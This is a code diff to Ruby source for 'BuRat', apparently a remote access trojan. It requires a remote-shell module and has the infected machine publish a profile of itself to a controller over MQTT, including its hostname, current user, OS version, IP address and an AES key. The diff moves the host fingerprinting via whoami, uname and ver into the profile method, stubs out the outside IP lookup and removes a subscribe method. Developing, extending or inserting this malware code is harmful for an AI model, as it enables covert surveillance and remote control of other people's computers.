@@ -13,12 +13,12 @@ require_relative 'bushido/remoteshell/buremoteshell'
 class BuRat
   attr_reader :id, :host, :os, :ip
   attr_accessor :status, :internals, :bushido
-  attr_accessor :topics
+  attr_reader :topics
   def initialize()
     @id = File.exist?('temp') ? File.read('temp') : File.read(File.write('temp', SecureRandom.hex(2).to_s))
-    @host = OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip
-    @os = (OS.windows? ? `ver` : `uname -sr`).strip
-    @ip = open('http://whatismyip.akamai.com').read
+    @host
+    @os
+    @ip
     @status = :offline
     @internals = {
       :mqtt           => {
@@ -41,9 +41,9 @@ class BuRat
   def profile()
     profile = {
     	:id => @id,
-    	:host => @host,
-    	:os => @os,
-    	:ip => @ip,
+    	:host => OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip,
+    	:os => (OS.windows? ? `ver` : `uname -sr`).strip,
+    	:ip => 'localhost', #open('http://whatismyip.akamai.com').read,
     	:status => @status,
     	:aes => {
     		:key => @internals[:aes].key,
@@ -78,10 +78,6 @@ class BuRat
     topic = @topics[topic].dup
     topic['+'] = id
     @internals[:mqtt][:burat].publish(topic, payload, retain, qos)
-  end
-
-  def subscribe()
-    @internals[:mqtt][:burat].subscribe(@cmd_topics)
   end
 
   def add_topics(topics)
